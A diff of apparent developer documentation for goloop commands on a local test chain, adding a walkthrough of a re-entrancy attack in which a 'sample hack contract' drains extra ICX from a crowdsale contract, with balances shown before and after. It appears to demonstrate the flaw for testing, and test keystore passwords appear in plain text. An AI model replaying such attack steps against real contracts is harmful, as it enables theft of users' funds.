@@ -231,8 +231,8 @@ $ goloop rpc --uri http://127.0.0.1:9082/api/v3 call --to cx093fce35905ec90c5fb3
 ### Transfer IRC2 token to crowdsale score to active crowdsale
 
 ```
-$ goloop rpc --uri http://127.0.0.1:9082/api/v3 sendtx call --to cxaa63b56be808d1a78e256626a59b6fa278b18a2c --method transfer \
-  --param _to=cx093fce35905ec90c5fb3699a40b38bd0b9f66853 \
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 sendtx call --to cxb1b1d96a6f0b61b9ea54878fa0fba5260d40d742 --method transfer \
+  --param _to=cx367d14721fdb56abd2851176f622a6bfd6175ae8 \
   --param _value=1000000000000000000000000 \
   --key_store ./godWallet.json --key_password gochain \
   --nid 0x3 --step_limit 2000000000
@@ -311,4 +311,66 @@ $ goloop rpc --uri http://127.0.0.1:9082/api/v3 balance hxb6b5791be0b5ef67063b3c
 goloop rpc --uri http://127.0.0.1:9082/api/v3 sendtx call --to cx093fce35905ec90c5fb3699a40b38bd0b9f66853 --method cancelWithdrawal \
   --key_store ./godWallet.json --key_password gochain \
   --nid 0x3 --step_limit 2000000000
+```
+
+## Crowdsale token SCORE re-entrancy attack
+
+### Transfer token to sample hack contract contract
+
+```bash
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 sendtx transfer --to cx1b77abb48190167d676be64a9e70e5f1f10f4cc9  --value 1000000000000000000 --key_store ./godWallet.json --key_password gochain --nid 0x3 --step_limit 1000000000
+```
+
+### sample hack contract deposit token to crowdsale
+
+```bash
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 sendtx call --to cx1b77abb48190167d676be64a9e70e5f1f10f4cc9 --method deposit \
+  --param _crowdsale=cx367d14721fdb56abd2851176f622a6bfd6175ae8 \
+  --param _amount=1000000000000000000 \
+  --key_store ./godWallet.json --key_password gochain \
+  --nid 0x3 --step_limit 2000000000
+```
+
+### get deposited balance of sample hack contract stored in crowdsale contract
+
+```bash
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 call --to cx367d14721fdb56abd2851176f622a6bfd6175ae8 --method balanceOf --param _owner=cxf99cec35fdab54c7c393287037ee9e3fcaeccc03
+```
+
+### other accounts deposit balance to crowdsale contract
+
+```bash
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 sendtx transfer --to cx367d14721fdb56abd2851176f622a6bfd6175ae8 --value 4000000000000000000000 --key_store ./daniel.json --key_password abc123456 --nid 0x3 --step_limit 1000000000
+```
+
+### Check ICX balance before hack
+
+```bash
+# balance of crowdsale contract
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 balance cx367d14721fdb56abd2851176f622a6bfd6175ae8
+8001000000000000000000
+
+# balance of sample hack contract
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 balance cxf99cec35fdab54c7c393287037ee9e3fcaeccc03
+3000000000000000000
+```
+### sample contract hack 
+
+```bash
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 sendtx call --to cxf99cec35fdab54c7c393287037ee9e3fcaeccc03 --method withdraw \
+  --param _crowdsale=cx367d14721fdb56abd2851176f622a6bfd6175ae8 \
+  --key_store ./godWallet.json --key_password gochain \
+  --nid 0x3 --step_limit 2000000000
+```
+
+### Check ICX balance after hack
+
+```bash
+# balance of crowdsale contract
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 balance cx367d14721fdb56abd2851176f622a6bfd6175ae8
+7994000000000000000000
+
+# balance of sample hack contract
+$ goloop rpc --uri http://127.0.0.1:9082/api/v3 balance cxf99cec35fdab54c7c393287037ee9e3fcaeccc03
+10000000000000000000
 ```
